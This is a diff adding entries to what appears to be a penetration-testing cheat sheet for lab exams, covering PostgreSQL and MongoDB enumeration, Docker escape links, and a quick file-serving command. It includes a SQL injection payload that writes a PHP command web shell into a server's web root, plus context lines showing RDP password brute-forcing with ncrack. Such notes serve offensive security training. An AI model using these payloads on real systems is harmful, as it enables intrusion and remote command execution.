@@ -36,9 +36,11 @@ Table of Contents
       * [Port 3339 - Oracle web interface](#port-3339-oracle-web-interface)
       * [RDP - 3389](#rdp-3389)
       * [WinRM - 5985](#winrm-5985)
+      * [PostgreSQL - 5432/5433](#postgresql-54325433)
       * [VNC - 5900](#vnc-5900)
       * [Redis - 6379](#redis-6379)
       * [MsDeploy - 8172](#msdeploy-8172)
+      * [Port 27017 - MongoDB](#port-27017-mongodb)
       * [Webdav](#webdav)
       * [Unknown ports](#unknown-ports)
       * [Port 80 - Web server](#port-80-web-server)
@@ -700,6 +702,15 @@ rdesktop -u guest -p guest 10.11.1.111 -g 94%
 ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
 ```
 
+## PostgreSQL - 5432/5433
+```
+psql -U <myuser> # Open psql console with user
+psql -h <host> -U <username> -d <database> # Remote connection
+psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
+```
+## Erland Port Mapper - 4369
+https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd
+
 ## VNC - 5900
 
 ```
@@ -727,6 +738,12 @@ python redis.py 10.10.10.160 redis
 ```
 Microsoft IIS Deploy port
 IP:8172/msdeploy.axd
+```
+## Port 27017 - MongoDB
+https://book.hacktricks.xyz/pentesting/27017-27018-mongodb
+
+```
+nmap -sV --script "mongo* and default" -p 27017 <IP> #By default all the nmap mongo enumerate scripts are used
 ```
 
 ## Webdav
@@ -998,6 +1015,9 @@ https://www.exploit-db.com/papers/17934
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 https://book.hacktricks.xyz/pentesting-web/sql-injection
+
+# SQL Web Shell
+'UNION SELECT ("<?php echo passthru($_GET['cmd'];") INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
 
 # Post
 ./sqlmap.py -r search-test.txt -p tfUPass
@@ -1304,12 +1324,21 @@ powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.49.
 # Docker
 https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
 
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+
+https://gtfobins.github.io/gtfobins/docker/
+
+# Docker Escape 
+
+Proving Grounds Sirol / Peppo
 ```
 
 ### Set up Webserver
 
 ```
 python -m SimpleHTTPServer 8080
+
+python3 -m http.server 8080
 https://github.com/sc0tfree/updog
 updog
 ```
